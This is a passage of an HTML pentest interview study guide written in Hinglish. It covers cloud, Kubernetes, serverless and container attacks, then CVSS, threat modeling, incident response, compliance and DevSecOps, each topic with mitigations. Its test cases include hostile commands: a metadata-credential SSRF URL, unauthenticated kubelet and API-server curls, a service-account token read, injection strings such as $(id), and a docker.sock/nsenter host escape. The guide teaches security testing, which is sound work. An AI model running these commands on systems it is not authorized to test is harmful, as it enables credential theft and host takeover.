+<div class="impact"><span class="lbl li">Impact</span><br>Cloud account takeover, mass data exfiltration, resource hijacking (crypto mining), lateral cloud movement.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>IMDSv2 (token-required) + hop limit 1 + SSRF fixes (Part 1 topic 8).</li>
+<li>Least privilege roles; no wildcard; regular policy review (IAM Access Analyzer).</li>
+<li>Short-lived keys + rotation; secrets in Vault/KMS — never user-data.</li>
+<li>Trust policies scoped (specific account/ARN, conditions).</li>
+<li>CloudTrail/audit logging + anomaly detection (GuardDuty).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>SSRF → <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> — creds milte hain? (IMDSv1 vs v2).</li>
+<li>Access keys leak: repo scan (gitleaks) — key valid? <code>aws sts get-caller-identity</code>.</li>
+<li>Role overpriv: attached policies list — S3:* / iam:* allowed?</li>
+<li>Wildcard: <code>Resource:"*"</code> policies — assess blast radius.</li>
+<li>Cross-account: assume-role policy — external account assume kar sakta hai?</li>
+<li>User-data: instance launch config — secrets embedded?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>SSRF via image URL parameter → IMDSv1 → IAM keys → S3 bucket list + full download. Fix: IMDSv2 + SSRF block + least privilege.</div>
+</section>
+
+<section class="topic" id="t40">
+<h2><span class="n">40</span>Kubernetes Security — Deep Dive</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>K8s attack surface: <b>1. exposed API server</b> (6443) — unauthenticated/anonymous allowed; <b>2. dashboard exposed</b> — bina auth (default token); <b>3. RBAC over-permissive</b> — <code>cluster-admin</code> everywhere; <b>4. secrets plaintext</b> in etcd + base64 only (not encryption); <b>5. pods run as root</b> — container escape → host; <b>6. service accounts</b> — default SA mounted in every pod; <b>7. kubelet API</b> (10250) unauth → exec pods; <b>8. supply chain images</b> — vulnerable/base image; <b>9. network policies absent</b> — flat network; <b>10. helm chart secrets</b>. Escape path: pod → node → cluster (kubeconfig/service account token in pod).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Full cluster takeover, all secrets, lateral to cloud account (node role), data theft.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>API server authN/Z strict: OIDC/mTLS, anonymous off, RBAC least privilege.</li>
+<li>Secrets: KMS encryption at rest; external secrets (Vault/External Secrets Operator).</li>
+<li>Pod Security Standards (restricted): no root, no privileged, read-only rootfs.</li>
+<li>NetworkPolicies default-deny + image scanning + signature (cosign).</li>
+<li>Audit logging + CIS benchmark (kube-bench) + admission controllers (OPA/Kyverno).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>API server: <code>curl -k https://IP:6443/api/v1/pods</code> bina token — anonymous allowed?</li>
+<li>Dashboard: 30000+ port open? default token?</li>
+<li>RBAC: apne SA ke permissions — <code>kubectl auth can-i --list</code> (after foothold).</li>
+<li>Pod: <code>id</code> — root? <code>cat /run/secrets/kubernetes.io/serviceaccount/token</code> — SA token.</li>
+<li>Kubelet: <code>curl http://IP:10250/pods</code> — unauth exec possible?</li>
+<li>NetworkPolicy: pod se pod reachable (flat network)?</li>
+<li>etcd: 2379 exposed — secrets readable?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Kubelet 10250 unauth → pod exec → SA token → RBAC cluster-admin → all secrets + node IAM role → cloud account. Fix: auth on kubelet + RBAC + network policies.</div>
+</section>
+
+<section class="topic" id="t41">
+<h2><span class="n">41</span>Serverless Security (AWS Lambda &amp; Cloud Functions)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Serverless (Lambda, GCP Cloud Functions, Azure Functions) attacks: <b>1. event injection</b> — untrusted input (event payload) code mein directly → injection (SQLi/NoSQLi/cmd); <b>2. over-privileged roles</b> — Lambda role with S3:* etc. → function hijack = cloud access; <b>3. insecure env vars</b> — secrets in env (plaintext in console); <b>4. dependency vulns</b> — runtime packages; <b>5. function event data exfil</b> — attacker-controlled input → external exfil; <b>6. SSRF</b> in functions (metadata topic 39); <b>7. DoS</b> — cost/rate abuse (unlimited invocation, expensive logic); <b>8. deserialization</b> — event body parsing; <b>9. misconfigured triggers</b> — public S3 trigger / unauthenticated API gateway; <b>10. no input size limits</b>. Cold start timing as info leak.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Cloud data access via Lambda role, injection/RCE in function, financial DoS (cost explosion), secret theft.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Least privilege function roles; separate role per function.</li>
+<li>Secrets via KMS/Secrets Manager — not env (or encrypted env).</li>
+<li>Input validation/sanitization (event payload = untrusted).</li>
+<li>Dependency scanning (SCA) + patched runtimes.</li>
+<li>Invocation limits, cost alerts, WAF on API gateway, function-level auth.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Event injection: function input <code>'; DROP TABLE--</code> / <code>$(id)</code> — execute hota hai?</li>
+<li>Role: function IAM role policy — S3:* / secretsmanager:GetSecretValue?</li>
+<li>Env: function config/console — secrets in env vars?</li>
+<li>Trigger: API gateway auth disabled? public bucket event?</li>
+<li>DoS: unlimited invocation — cost guardrails hain? (authorized, careful).</li>
+<li>Deps: lambda layer/package scan — known CVEs?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Lambda image-resize function: SSRF + S3:* role — attacker ne internal metadata + S3 buckets dump kiya. Fix: role least-priv + egress VPC + input validation.</div>
+</section>
+
+<section class="topic" id="t42">
+<h2><span class="n">42</span>Container Escape &amp; Docker Security</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Container = namespaces + cgroups (shared kernel — NOT VM isolation). <b>Escape vectors:</b> <b>1. privileged container</b> (<code>--privileged</code>, CAP_SYS_ADMIN) → <code>nsenter</code>/<code>cgroup release_agent</code> → host root; <b>2. Docker socket mounted</b> (<code>/var/run/docker.sock</code>) → <code>docker run -v /:/host</code> → host; <b>3. kernel CVEs</b> — Dirty COW (CVE-2016-5195), CVE-2022-0185 (unprivileged userns), CVE-2024-1086 (nf_tables); <b>4. hostPath mounts</b> — /etc, /root readable/writable; <b>5. cap_sys_ptrace</b> — host process injection; <b>6. runc/containerd CVEs</b> (CVE-2019-5736); <b>7. misconfigured seccomp/AppArmor</b> — unrestricted syscalls; <b>8. shared /proc</b> info leaks.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Host compromise → full infra; container breakout = pivot from app-level to infrastructure.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Never privileged; drop all caps (<code>--cap-drop=ALL</code>); no docker.sock mounts.</li>
+<li>Seccomp + AppArmor/SELinux profiles; non-root user in image.</li>
+<li>Read-only rootfs; no hostPath (or restricted, read-only).</li>
+<li>Keep kernel/runc/containerd patched (CVE updates).</li>
+<li>Image scanning + minimal base images + distroless.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Privileged check: <code>cat /proc/self/status | grep CapEff</code> — 0000003fffffffff (all caps)?</li>
+<li>Docker socket: <code>ls -la /var/run/docker.sock</code> — mounted? → host root via docker.</li>
+<li>HostPath: /etc/shadow /root readable/writable inside container?</li>
+<li>CVE test (authorized lab): CVE-2022-0185 / CVE-2024-1086 PoC — escape attempt.</li>
+<li>Syscalls: seccomp enabled? <code>grep Seccomp /proc/self/status</code> (2 = filter).</li>
+<li>nsenter: <code>nsenter --target 1 --mount --uts --ipc --net --pid sh</code> (privileged case).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Pod privileged + docker.sock — attacker ne <code>docker run -v /:/host</code> se host filesystem mounted → host root + kubelet creds. Fix: PSS restricted + no socket mounts + seccomp.</div>
+</section>
+
+<!-- ==================== PROCESS, FRAMEWORKS & CAREER ==================== -->
+<h3 class="category">Process, Frameworks &amp; Career</h3>
+
+<section class="topic" id="t43">
+<h2><span class="n">43</span>CVSS v3.1 — Deep Dive</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>CVSS (Common Vulnerability Scoring System) v3.1 = standardized severity score (0–10). <b>Base metrics (0–10):</b> <b>AV</b> (Attack Vector — N/network, A/adjacent, L/local, P/physical), <b>AC</b> (Attack Complexity — L/H), <b>PR</b> (Privileges Required — N/L/H), <b>UI</b> (User Interaction — N/R), <b>S</b> (Scope — U/C: component beyond vulnerable component affected), <b>C/I/A</b> (Confidentiality, Integrity, Availability — N/L/H). <b>Temporal</b> (E: exploit code maturity, RL: remediation level, RC: report confidence) aur <b>Environmental</b> (security requirements per org) modify karte hain. Vector example: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> = 9.8 Critical. Severity bands: 0.1–3.9 Low, 4.0–6.9 Medium, 7.0–8.9 High, 9.0–10 Critical.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Scoring drives prioritization (patch order), SLAs, executive communication. Galat scoring = galat priorities (unpatched critical vs over-patched low).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Score with official calculator (FIRST/NIST) — consistent methodology.</li>
+<li>Combine with context: exploitability (EPSS), asset criticality, exposure — CVSS alone incomplete.</li>
+<li>Re-score with environmental metrics for your org (C/I/A requirements).</li>
+<li>Document assumptions in every finding; review scores in triage.</li>
+<li>Map to risk: CVSS (severity) × asset value × exposure = priority.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Practice: given finding (e.g. unauth SQLi on public API) — vector banao, score nikaalo.</li>
+<li>Compare: same vuln Local vs Network AV — score kitna badalta hai?</li>
+<li>Scope: S:U vs S:C — score diff samjho (S:C +1-ish).</li>
+<li>EPSS: <code>https://www.first.org/epss/</code> — real CVE ka probability percentile dekho.</li>
+<li>Red team report: har finding mein vector string + score + justification likho.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interview: "Log4Shell = CVSS 10 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) — but environment (exposed vs internal) se effective risk decide hota hai. CVSS severity hai, risk nahi."</div>
+</section>
+
+<section class="topic" id="t44">
+<h2><span class="n">44</span>Threat Modeling — STRIDE, DREAD, Attack Trees</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Threat modeling = design phase mein threats pehle se identify karna. <b>STRIDE (Microsoft)</b> per component: <b>S</b>poofing (fake identity), <b>T</b>ampering (data modify), <b>R</b>epudiation (deny action), <b>I</b>nformation disclosure, <b>D</b>enial of Service, <b>E</b>levation of Privilege. <b>DREAD</b> = risk scoring: Damage, Reproducibility, Exploitability, Affected users, Discoverability (each 1–10). <b>Attack trees</b> — root goal → sub-attacks (AND/OR branches). <b>Data flow diagrams (DFD)</b> — trust boundaries mark karo. Process: scope → decompose (DFD) → identify threats (STRIDE per element) → rate (DREAD) → mitigate → validate.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Vulns design mein pakdo (cheap to fix) vs production (expensive); architecture decisions guided by threats.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Threat modeling every feature/design change (not just new apps).</li>
+<li>Use STRIDE checklist per trust boundary; document in repo.</li>
+<li>Tools: Microsoft Threat Modeling Tool, OWASP Threat Dragon, pytm.</li>
+<li>Rate threats (DREAD/likelihood×impact) — top threats pe focus.</li>
+<li>Track mitigations as requirements; retest after changes.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Practice: e-commerce app ka DFD banao — trust boundaries mark karo.</li>
+<li>STRIDE walk: har element par 6 threats brainstorm karo.</li>
+<li>Attack tree: "Get admin access" goal — branches likho (SQLi, session, social).</li>
+<li>DREAD score: top threats rate karo — priority order milega.</li>
+<li>Tool: OWASP Threat Dragon mein diagram + threats export karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>New SSO integration — threat model ne "IdP confusion" identify kiya → issuer allowlist design mein add hua → production mein woh attack fail hua. Fix: design-time threat modeling.</div>
+</section>
+
+<section class="topic" id="t45">
+<h2><span class="n">45</span>Incident Response — NIST 800-61 Phases &amp; Playbooks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>IR lifecycle (NIST SP 800-61): <b>1. Preparation</b> — policy, playbooks, tools, training, backups; <b>2. Detection &amp; Analysis</b> — alerts, triage, scoping, indicators (IOCs), containment criteria; <b>3. Containment, Eradication &amp; Recovery</b> — isolate (short-term) → remove (eradicate: malware, backdoors, accounts) → restore (long-term containment, verify) → recovery with validation; <b>4. Post-Incident Activity</b> — lessons learned, report, process improvement. SANS version: 6 phases (adds Identification). <b>Key artifacts:</b> timeline, chain of custody, IR plan, communication plan, severity classification. Detection: SIEM, EDR, logs (auth, network, DNS), threat intel.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Bad IR = ransomware spreads, data exfil continues, evidence destroyed, regulatory fines. Good IR = contained in hours, root cause fixed, lessons applied.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Written IR plan + playbooks (phishing, ransomware, insider, cloud).</li>
+<li>24/7 monitoring (SIEM/EDR) + defined alert triage SLAs.</li>
+<li>Pre-staged evidence collection (RAM, logs, snapshots) — chain of custody.</li>
+<li>Regular tabletop exercises + red-team-driven drills.</li>
+<li>Post-incident: root cause analysis → fixes tracked to closure.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Interview: incident walkthrough — "alarm aaya, kya karte ho?" (triage → scope → contain → eradicate → recover → lessons).</li>
+<li>Playbook drill: ransomware scenario — isolation steps, comms, legal.</li>
+<li>Evidence: Volatility (RAM dump) + log collection practice.</li>
+<li>Timeline: alert se recovery tak timeline banao — gaps dhundho.</li>
+<li>Tabletop: board members ke saath decision drills.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Ransomware alert: EDR ne encryption activity detect kiya → 15 min mein host isolated → scope analysis (1 server, no lateral) → restore from backup → root cause (phished admin) → MFA forced. Fix: prep + monitoring + playbooks saved the org.</div>
+</section>
+
+<section class="topic" id="t46">
+<h2><span class="n">46</span>Red Team vs Blue Team vs Purple Team</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Red team</b> — adversarial simulation: real TTPs (MITRE ATT&amp;CK), multi-stage, stealthy, goal-based (exfil flag/domain admin), bina rules of engagement ke boundaries par; evades detection intentionally. <b>Blue team</b> — defenders: monitoring (SIEM/EDR), detection engineering, hunting, IR, hardening. <b>Purple team</b> — collaboration: red + blue ek saath — red team attacks, blue team detects/learns, gaps identified → detections built; continuous loop. <b>Others:</b> purple teaming exercises, adversary emulation frameworks (Atomic Red Team, Caldera). Metrics: time-to-detect, coverage vs ATT&amp;CK, detection gaps. Difference from pentest: pentest = scope-specific vuln validation; red team = org-wide security posture test.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Red team: real-world readiness check (detection + response, not just vulns). Purple: team skill + detection coverage improvement.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Define objectives (flags/crown jewels) + rules of engagement clearly.</li>
+<li>MITRE ATT&amp;CK mapping — coverage visibility.</li>
+<li>Purple exercises after each red engagement (detections build).</li>
+<li>Share intel: red team findings → blue team detection rules.</li>
+<li>Track metrics: detection time, response time, gap closure rate.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Red exercise: phishing → foothold → lateral → exfil — kya detect hua? kahan?</li>
+<li>ATT&amp;CK map: apne TTPs ka coverage matrix banao.</li>
+<li>Atomic Red Team: detection test — atomic test chalao, alert aata hai?</li>
+<li>Purple: ek technique detect karo → detection rule likho → retest.</li>
+<li>Metrics: time-to-detect (TTD) measure karo per phase.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Red team 30 din mein "domain admin" le gaya — blue team ne kuch nahi dekha (no logging) → purple phase: detections built → next exercise 3rd phase par pakda gaya. Fix: purple loop + logging gaps.</div>
+</section>
+
+<section class="topic" id="t47">
+<h2><span class="n">47</span>Compliance — ISO 27001, NIST CSF, PCI DSS, GDPR</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>ISO 27001</b> — ISMS framework (Annex A controls, PDCA, certification audits); <b>NIST CSF</b> — 5 functions: Identify, Protect, Detect, Respond, Recover (flexible, US gov/industry); <b>PCI DSS</b> — card data: 12 requirements (network security, encryption, access control, monitoring, testing — v4.0: zero-trust leanings, SAQ vs full assessment); <b>GDPR</b> — EU data protection: DPIA, breach notification 72h, data minimization, rights (erasure/portability), fines up to 4% revenue; <b>others:</b> SOC 2 (trust services criteria), HIPAA (health), SOX (finance), CCPA. Pentester relevance: scoping (in-scope systems), evidence/report format, testing windows, data protection in findings.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Non-compliance = fines, contract loss, audit failures; compliance ≠ security but drives baseline controls + testing cadence.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Map controls to framework (control matrix) — gap analysis.</li>
+<li>Automate evidence collection (config scans, asset inventory).</li>
+<li>Quarterly/annual pentests per PCI/GDPR requirements; scope correctly.</li>
+<li>Continuous monitoring + risk register for exceptions.</li>
+<li>Train teams on compliance requirements (data handling).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Interview: "PCI mein kaunsa test mandatory?" — ASV scan + QSA pentest + segmentation test.</li>
+<li>GDPR: data flow map — PII kahan hai? retention? erasure workflow?</li>
+<li>ISO: internal audit simulation — control evidence gather karo.</li>
+<li>NIST CSF: maturity assessment — har function score karo.</li>
+<li>Breach sim: 72h notification drill — process ready?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>PCI scope mein CDE (card data environment) mis-scoped tha — segmentation test ne gap dikhaya → attacker CDE tak pahunch sakta tha. Fix: proper scoping + quarterly ASV + annual pentest.</div>
+</section>
+
+<section class="topic" id="t48">
+<h2><span class="n">48</span>Vulnerability Management Lifecycle</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Continuous VM process: <b>1. Discover/Inventory</b> — assets (agents + agentless, cloud + on-prem); <b>2. Identify/Scan</b> — authenticated scans, SCA, DAST, threat intel feeds; <b>3. Assess/Risk-rate</b> — CVSS (topic 43) × asset criticality × exploitability (EPSS) → priority; <b>4. Remediate</b> — patch, mitigate (compensating controls), accept (risk owner sign-off); <b>5. Verify</b> — rescan, patch confirmation; <b>6. Report</b> — KPIs: mean time to remediate (MTTR), patch coverage, SLA compliance, risk trend. Challenges: false positives, patch conflicts, legacy systems, prioritization overload ("patch everything" impossible). Tooling: Qualys/Tenable/Rapid7, OpenVAS (free), patch mgmt (WSUS/SCCM/Ansible), ticket integration (Jira/Snow).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Unpatched criticals = breach (Equifax 2017 = unpatched Struts). Good VM = measurable risk reduction + audit-ready.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Risk-based prioritization (CVSS + EPSS + asset value) — not just score.</li>
+<li>Automated scans (weekly/monthly) + authenticated where possible.</li>
+<li>SLA tiers by severity (Critical: 7d patch, High: 30d, etc.).</li>
+<li>False-positive triage process + re-validation.</li>
+<li>Executive reporting: MTTR, risk score trend, exceptions register.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Lab: OpenVAS/nessus scan — findings ko CVSS + EPSS se prioritize karo.</li>
+<li>Patch cycle test: critical patch deploy → rescan → closed? (verify step).</li>
+<li>KPI: MTTR calculate karo (reporting practice).</li>
+<li>Exception process: accepted risk register banao — sign-off flow.</li>
+<li>Discovery gap: unmanaged assets scan karo — inventory mein missing? (agent vs agentless).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Equifax: Apache Struts CVE-2017-5638 scan mein tha but patch queue mein delay → breach (147M records). Fix: risk-based prioritization + SLA enforcement — not just "scan and report".</div>
+</section>
+
+<section class="topic" id="t49">
+<h2><span class="n">49</span>DevSecOps — CI/CD Pipeline Security &amp; Shift-Left</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Security ko development lifecycle mein integrate karna (shift-left). <b>Pipeline stages:</b> <b>1. IDE/pre-commit</b> — SAST (Semgrep/CodeQL/SonarQube), secret scanning (gitleaks), linting; <b>2. build</b> — dependency SCA (npm audit/Dependency-Check/Snyk), container scanning (Trivy/Grype), SBOM generation; <b>3. test</b> — DAST (ZAP/GitLab DAST), unit/integration security tests; <b>4. deploy</b> — IaC scanning (Checkov/Tfsec), signing (cosign), policy gates, runtime (Falco), secrets (Vault); <b>5. post-deploy</b> — continuous monitoring, pen-test schedule, bug bounty. <b>Pipeline security itself:</b> CI secrets (env vars, tokens), supply chain (topic 34), poisoned artifacts, pull-request code review, runner isolation, signed commits.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Vulns production mein pahunchne se pehle pakdo (10x cheaper); compromised pipeline = supply chain attack (SolarWinds).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Gates per stage: SAST/SCA fail → build fail (no exceptions without review).</li>
+<li>Secrets: Vault/KMS + never in env/repo; rotate automatically.</li>
+<li>Scan everything: code, deps, containers, IaC, third-party actions (pinned).</li>
+<li>Signed artifacts + verified provenance (SLSA).</li>
+<li>Isolate runners, least-privilege CI tokens, audit pipeline config.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Lab: git repo mein secret commit karo → gitleaks detect karta hai?</li>
+<li>SAST: Semgrep rule se vuln pattern — CI gate fail hota hai?</li>
+<li>SCA: vulnerable dep pin karo → audit fail? (fail-on-vuln config).</li>
+<li>IaC: Checkov — S3 public wala Terraform → policy fail?</li>
+<li>Trivy: vulnerable base image scan → build blocked?</li>
+<li>CI secrets: pipeline env dump — tokens accessible? (authorized lab).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Production se pehle SAST ne SQLi + SCA ne Log4Shell dep pakdi — release blocked, fix+retest → deploy. Interview: "Shift-left = vulns cheap fix, gates enforce, no security theater."</div>
+</section>
+
+<section class="topic" id="t50">
+<h2><span class="n">50</span>Final Cheat Sheet &amp; Scenario Q&amp;A</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Sabse zyada puchhe jaane wale interview scenarios — 1-line framework answers: <b>1.</b> "SQLi detect kaise?" — <code>'</code> error → boolean diff → time/OOB confirm. <b>2.</b> "XSS stored XSS banaya, phir?" — session cookie HttpOnly hai to CSRF/UI redressing chain ya keylogger; HttpOnly nahi to cookie steal + login CSRF. <b>3.</b> "IDOR mila?" — object-level check missing confirm karo (two accounts) → report with impact + fix (server-side ownership). <b>4.</b> "JWT alg:none?" — signature verify na hone par bypass — fix: allowlist + verify. <b>5.</b> "SSRF se aage?" — metadata (169.254.169.254), internal services, cloud creds — report + fix: allowlist egress. <b>6.</b> "RCE mila?" — reverse shell → privilege escalation → lateral → impact demo → cleanup + report. <b>7.</b> "Report kaise likhte ho?" — executive summary, scope, methodology, findings (risk-ranked, CVSS), evidence, remediation, retest. <b>8.</b> "Bug bounty ke liye?" — scope read karo, low-hanging (IDOR/InfoLeak), quality reports, responsible disclosure.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Interview mein answer quality = structured (detect → confirm → exploit → impact → fix) + real-world examples + priorities clear.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Always: detect → confirm (proof) → impact → remediation → retest cycle.</li>
+<li>Severity + CVSS + business impact har finding mein.</li>
+<li>Evidence: requests/responses, screenshots, PoC (clean).</li>
+<li>Never overstate; test scope ke andar; data cleanup.</li>
+<li>Follow-up: fix verification + regression tests.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Mock interview: "Aapko blind RCE suspect hai, plan kya?" — time-based → OOB → exploit → impact.</li>
+<li>Whiteboard: 3-tier app ka attack flow draw karo (web → API → DB).</li>
+<li>Report drill: ek finding ka full report likho (5 sections).</li>
+<li>Prioritization: 10 findings diye — kis order mein fix karaoge? (risk-based).</li>
+<li>Scenario: "Client nahi maan raha vuln serious hai" — business impact se convince karo (breach cost, compliance).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Full interview answer template: "Finding: IDOR on /api/users/:id. Evidence: User A token se User B ka PII. Impact: mass PII exposure (High, CVSS 7.5). Fix: server-side object-level authorization + UUIDs + audit log. Retest: two-account matrix in CI." — isi pattern se koi bhi scenario answer karo.</div>
+</section>
+
+</main>
+</div>
+
+<footer>
+Part 3 of 3 — Advanced Deep-Dives (50 topics) · Pentest Interview Master Guide<br>
+Parts 1 (index.html — Web/API/Mobile) + 2 (part2.html — Network/Process/Tools) + 3 (this file) = full coverage<br>
+Save as <code>part3.html</code> and open in any browser — fully offline, searchable, print-ready.
+</footer>
+
+<script>
+const q = document.getElementById('q');
+const topics = document.querySelectorAll('.topic');
+const cats = document.querySelectorAll('.category');
+const count = document.getElementById('count');
+const total = topics.length;
+
+function applyFilter() {
+  const term = q.value.trim().toLowerCase();
+  let visible = 0;
+  topics.forEach(t => {
+    const match = !term || t.textContent.toLowerCase().includes(term);
+    t.style.display = match ? '' : 'none';
+    if (match) visible++;
+  });
+  cats.forEach(c => {
+    let hasVisible = false;
+    let sib = c.nextElementSibling;
+    while (sib && sib.tagName !== 'H3') {
+      if (sib.classList.contains('topic') && sib.style.display !== 'none') { hasVisible = true; break; }
+      sib = sib.nextElementSibling;
+    }
+    c.style.display = hasVisible ? '' : 'none';
+  });
+  count.textContent = term ? (visible + ' / ' + total + ' topics') : total + ' topics';
+}
+q.addEventListener('input', applyFilter);
+applyFilter();
+</script>
+</body>
+</html>
